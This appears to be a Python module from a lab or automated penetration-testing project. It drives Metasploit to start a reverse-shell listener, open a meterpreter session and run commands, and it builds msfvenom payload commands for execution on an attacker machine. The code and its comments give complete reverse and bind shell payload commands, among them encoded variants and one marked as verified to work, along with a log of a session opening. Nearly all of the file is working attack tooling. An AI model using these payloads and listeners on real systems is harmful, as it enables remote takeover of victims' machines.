#!/usr/bin/env python3

from pymetasploit3.msfrpc import MsfRpcClient
from app.machinecontrol import Machine



# https://github.com/DanMcInerney/pymetasploit3

# Requirements
# TODO Connect to metasploit on kali machine
# TODO Multi sessions
# Add msfvenom class to generate payloads and fetch them


class Metasploit():
    def __init__(self, password, **kwargs):
        """

        :param password: password for the msfrpcd
        :param kwargs: Relevant ones: uri, port, server, username
        """

        self.client = MsfRpcClient(password, **kwargs)

        # Waiting for reverse shell
        exploit = self.client.modules.use('exploit', 'exploit/multi/handler')
        print(exploit.description)
        print(exploit.missing_required)
        payload = self.client.modules.use('payload', 'linux/x64/meterpreter_reverse_tcp')
        print(payload.description)
        print(payload.missing_required)
        payload["LHOST"] = "192.168.178.125"

        res = exploit.execute(payload=payload)
        print(res)
        print(self.client.sessions.list)
        sid = list(self.client.sessions.list)[0]

        shell = self.client.sessions.session(sid)
        shell.write("getuid")
        print(shell.read())


class MSFVenom():
    def __init__(self, attacker: Machine, target: Machine):
        """

        :param attacker: attacker machine
        """
        # https://www.offensive-security.com/metasploit-unleashed/msfvenom/

        self.attacker = attacker
        self.target = target

    def generate_cmd(self, **kwargs):
        """ Generates a cmd


        :return:
        """
        payload = kwargs.get("payload", None)
        architecture = kwargs.get("architecture", None)
        platform = kwargs.get("platform", self.target.get_os())
        lhost = kwargs.get("lhost", self.attacker.get_ip())
        format = kwargs.get("format", None)  # file format
        outfile = kwargs.get("outfile", "exploit.exe")

        cmd = "msfvenom"
        if architecture is not None:
            cmd += f" -a {architecture}"
        if platform is not None:
            cmd += f" --platform {platform}"
        if payload is not None:
            cmd += f" -p {payload}"
        if lhost is not None:
            cmd += f" LHOST={lhost}"
        if format is not None:
            cmd += f" -f {format}"
        if outfile is not None:
            cmd += f" -o {outfile}"



        # -p payload  linux/x86/meterpreter_reverse_tcp
        # -f format: elf, exe, powershell, python
        # --platform: linux, windows, osx
        # -a arch: x86, x64
        # -e encoders: x86/shikata_ga_nai
        # -b bad chars to avoid
        # -i iterations. encoding iterations
        # -o <filename> out filename
        # root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python
        # complex: msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.178.125 -e x86/shikata_ga_nai -i 3 -f elf -o reverse_meterpreter

        # verified to work (Linux): msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.178.125  -f elf -o reverse_meterpreter

        # Keep in mind: The msfconsole needs to actively listen to the connection:
        # msf6 > use exploit/multi/handler
        # [*] Using configured payload generic/shell_reverse_tcp
        # msf6 exploit(multi/handler) > set payload linux/x64/meterpreter_reverse_tcp
        # payload => linux/x64/meterpreter_reverse_tcp
        # msf6 exploit(multi/handler) > set lhost 192.168.178.125
        # lhost => 192.168.178.125
        # msf6 exploit(multi/handler) > set lport 4444
        # lport => 4444
        # msf6 exploit(multi/handler) > run
        #
        # [*] Started reverse TCP handler on 192.168.178.125:4444
        # [*] Meterpreter session 1 opened (192.168.178.125:4444 -> 192.168.178.125:42436) at 2021-06-01 03:32:12 -0400
        #
        # meterpreter >   !!! We are in the session now !!!

        return cmd

    def generate_payload(self, **kwargs):
        """ Generates a payload on the attacker machine

        """
        cmd = self.generate_cmd(**kwargs)

        self.attacker.remote_run(cmd)

